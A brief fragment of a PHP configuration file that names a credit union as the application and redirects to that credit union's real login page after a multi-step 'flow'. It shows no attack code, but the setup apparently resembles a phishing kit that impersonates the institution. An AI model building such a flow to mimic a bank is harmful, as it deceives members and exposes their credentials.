...
/**
 * Configuration file for Affinity PHP Application
...
define('APP_NAME', 'Affinity Plus Federal Credit Union');
...
// Flow Configuration
define('FINAL_REDIRECT_URL', 'https://affinityplus.org/login'); // Final redirect after completion
